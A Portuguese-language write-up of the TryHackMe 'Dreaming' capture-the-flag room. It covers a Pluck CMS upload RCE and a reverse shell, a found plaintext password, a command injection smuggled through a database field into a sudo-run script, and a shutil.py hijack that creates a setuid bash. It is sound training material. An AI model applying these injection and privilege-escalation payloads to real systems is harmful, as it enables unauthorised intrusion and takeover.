<div align="center">

# 🌙 TryHackMe – Dreaming (Writeup)

*"Solve the riddle that dreams have woven."* ✨💭  

<p align="center">
  <img src="https://readme-typing-svg.herokuapp.com?font=Fira+Code&size=22&pause=1000&color=00FFFF&width=600&lines=Linux+Exploitation;Web+Exploitation;Privilege+Escalation;CTF+Walkthrough" alt="Typing SVG" />
</p>

</div>

---
<div align="center">

## 📌 Informações da Máquina

- **Categoria:** Linux | Web  
- **Dificuldade:** 🟢 Easy  
- **Tempo Estimado:** ⏱️ 45 min  
- **Status:** ✅ Rooted com sucesso  
- **Link:** [Dreaming](https://tryhackme.com/room/dreaming)

</div>

---
<div align="center">
    
## 🗺️ Roadmap da Exploração

</div>

```mermaid
graph TD
A[Enumeração Inicial] --> B[Identificação Pluck CMS]
B --> C[Exploração RCE via Upload]
C --> D[Reverse Shell www-data]
D --> E[Credenciais Lucien em test.py]
E --> F[SSH Lucien]
F --> G[Sudo Abuse - getDreams.py]
G --> H[Injeção SQL + Subprocess Injection]
H --> I[Shell como Death]
I --> J[Credenciais Death via getDreams.py]
J --> K[Escalada em Morpheus com Hijack shutil.py]
K --> L[Root Shell + Flags]
````

---

## 🔍 Enumeração Inicial

```bash
root@ip-10-201-77-121:~# nmap -sS -v $ALVO
Starting Nmap 7.80 ( https://nmap.org ) at 2025-08-19 23:40 BST
...
22/tcp open  ssh
80/tcp open  http
```

📌 Serviços identificados → **SSH + HTTP**

---

## 🌐 Enumeração Web

```bash
root@ip-10-201-77-121:~# gobuster dir -u http://$ALVO -w /usr/share/wordlists/dirb/common.txt -x html,txt,php -t 50 --no-error
...
/app (Status: 301) [--> http://10.201.77.64/app/]
/index.html (Status: 200) [Size: 10918]
```

📌 `/app` → **Pluck CMS 4.7.13**

---

## ⚔️ Exploração – Pluck CMS

```bash
root@ip-10-201-77-121:~# searchsploit pluck 4.7.13
Pluck CMS 4.7.13 - File Upload Remote Code Execution (Authenticated) | php/webapps/49909.py
```

📌 Vulnerabilidade: **File Upload RCE**

---

## 📡 Reverse Shell

```bash
root@ip-10-201-77-121:~# nc -lnvp 1234
Listening on 0.0.0.0 1234
Connection received on 10.201.77.64 35562
Linux ip-10-201-77-64 5.15.0-138-generic ...
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Shell como **www-data** ✅

---

## 🔑 Movendo para Lucien

### Encontrando credenciais

```bash
$ cd /opt
$ cat test.py
...
password = "HeyLucien#@1999!"
```

📌 Credenciais → `lucien : HeyLucien#@1999!`

---

### Acessando via SSH

```bash
ssh lucien@10.201.77.64
```

---

## 👤 Flag Lucien

```bash
lucien@ip-10-201-77-64:~$ cat lucien_flag.txt 
THM{************}
```

---

## 🗄️ Sudo Abuse – Death

```bash
lucien@ip-10-201-77-64:~$ sudo -l
(lucien) NOPASSWD: (death) /usr/bin/python3 /home/death/getDreams.py
```

### SQL Injection em subprocess

```sql
mysql> UPDATE dreams SET dream = '; /bin/bash -p' WHERE dreamer = 'Alice';
```

Executando:

```bash
lucien@ip-10-201-77-64:~$ sudo -u death /usr/bin/python3 /home/death/getDreams.py 
death@ip-10-201-77-64:/home/lucien$ 
```

---

## 👤 Flag Death

```bash
death@ip-10-201-77-64:~$ cat death_flag.txt 
THM{************}
```

---

## 🏰 Escalada Final – Morpheus

Encontrado em `/home/morpheus/restore.py`:

```python
from shutil import copy2 as backup
```

📌 Hijack `shutil.py` → injetando código malicioso:

```python
import os
os.system("cp /bin/bash /tmp && chmod +s /tmp/bash")
```

---

### Execução

```bash
death@ip-10-201-96-79:/tmp$ ./bash -p
bash-5.0$ whoami
morpheus
```

---

## 👑 Flag Morpheus

```bash
bash-5.0$ cat morpheus_flag.txt
THM{************}
```

---

## 🧩 Fluxo Final

1. Enumeração → serviços SSH/HTTP.
2. Descoberta de **Pluck CMS**.
3. Exploração RCE → shell **www-data**.
4. Credenciais em `/opt/test.py` → acesso SSH **lucien**.
5. `sudo` permitido → execução de **getDreams.py**.
6. Injeção SQL → pivot para **death**.
7. Credenciais MySQL → leitura de código.
8. Hijack de **shutil.py** → rootando **morpheus**.

---

## 🎉 Conclusão

Box criativa e bem construída:

* Mostra exploração de **CMS vulnerável**
* Uso de **subprocess injection via DB**
* Escalada de privilégios via **Python hijacking**
* Um caminho que realmente simula um "labirinto de sonhos"

💡 Ótima sala para praticar pivoting e encadeamento de vetores.

---

<div align="center">

![Snake animation](https://github.com/Platane/snk/raw/output/github-contribution-grid-snake.svg)

</div>
